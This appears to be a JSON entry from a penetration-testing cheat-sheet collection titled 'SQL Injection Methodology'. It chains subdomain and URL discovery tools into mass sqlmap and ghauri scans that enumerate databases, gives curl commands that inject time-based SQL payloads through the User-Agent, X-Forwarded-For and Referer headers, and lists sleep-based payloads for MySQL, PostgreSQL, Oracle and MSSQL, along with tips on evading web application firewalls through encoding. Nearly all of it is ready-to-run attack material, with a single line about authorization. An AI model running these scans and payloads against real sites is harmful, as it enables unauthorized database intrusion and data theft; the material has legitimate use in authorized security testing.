{
    "id": "sqli-methodology",
    "title": "SQL Injection Methodology",
    "category": "Web Security",
    "commands": [
        {
            "cmd": "subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'",
            "info": "Single domain reconnaissance for potential SQL injectable endpoints"
        },
        {
            "cmd": "subfinder -d -l subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'",
            "info": "Multiple subdomain reconnaissance for SQL injection testing"
        },
        {
            "cmd": "echo https://example.com | gau | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='",
            "info": "Discover potential SQL injectable parameters using gau"
        },
        {
            "cmd": "echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp'",
            "info": "Alternative method for finding SQL injectable endpoints using katana"
        },
        {
            "cmd": "subfinder -d https://example.com -all -silent | gau --threads 50 | uro | gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm",
            "info": "Mass SQL injection testing using ghauri"
        },
        {
            "cmd": "subfinder -d https://example.com -all -silent | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent",
            "info": "Comprehensive SQL injection testing using sqlmap"
        },
        {
            "cmd": "curl -s -H 'User-Agent: 'XOR(if(now()=sysdate(),sleep(5),0))XOR' --url 'https://example.com'",
            "info": "Testing for time-based SQL injection via User-Agent header"
        },
        {
            "cmd": "curl -s -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' --url 'https://example.com'",
            "info": "Testing for time-based SQL injection via X-Forwarded-For header"
        },
        {
            "cmd": "curl -s -H 'Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'' --url 'https://example.com'",
            "info": "Testing for time-based SQL injection via Referer header"
        },
        {
            "cmd": "curl -v -A 'Mozilla/5.0', (select*from(select(sleep(20)))a) # 'http://example.com'",
            "info": "Alternative User-Agent based SQL injection test"
        },
        {
            "cmd": "curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET 'https://example.com'",
            "info": "User-Agent header-based MySQL time-based injection"
        },
        {
            "cmd": "curl -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' -X GET 'https://example.com'",
            "info": "X-Forwarded-For header-based MySQL time-based injection"
        },
        {
            "cmd": "curl -H 'Referer: https://example.com/'+(select*from(select(if(1=1,sleep(20),false)))a)+'' -X GET 'https://example.com'",
            "info": "Referer header-based MySQL time-based injection"
        },
        {
            "cmd": "SELECT dbms_pipe.receive_message(('a'),10) FROM dual",
            "info": "Oracle database time-based injection payload"
        },
        {
            "cmd": "WAITFOR DELAY '0:0:10'",
            "info": "Microsoft SQL Server time-based injection payload"
        },
        {
            "cmd": "SELECT pg_sleep(10)",
            "info": "PostgreSQL time-based injection payload"
        },
        {
            "cmd": "SELECT sleep(10)",
            "info": "MySQL time-based injection payload"
        },
        {
            "cmd": "0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z",
            "info": "MySQL alternative time-based payload with URL encoding"
        },
        {
            "cmd": "'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1",
            "info": "PostgreSQL complex time-based injection payload"
        },
        {
            "cmd": "if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0))OR'*/",
            "info": "MySQL multi-condition time-based payload with comment bypass"
        },
        {
            "cmd": "1234 AND SLEEP(10)';WAITFOR DELAY '00:00:05';--",
            "info": "Combined MySQL and MSSQL time-based payload"
        },
        {
            "cmd": "paramname=1'-IF(1=1,SLEEP(10),0) AND paramname='1",
            "info": "Numeric parameter time-based injection payload"
        }
    ],
    "tips": [
        "Always test for different SQL database types (MySQL, PostgreSQL, Oracle, MSSQL)",
        "Use time-based payloads when blind SQL injection is suspected",
        "Test all input parameters, including headers and cookies",
        "Start with low-risk payloads before increasing complexity",
        "Monitor response times carefully for time-based injections",
        "Document all findings and successful payloads",
        "Use different encoding techniques to bypass WAF",
        "Always get proper authorization before testing",
        "Test numeric parameters with specific numeric-based payloads",
        "Try different comment syntax for different databases",
        "Use database-specific functions for more accurate detection",
        "Combine multiple techniques when basic payloads fail"
    ]
} 
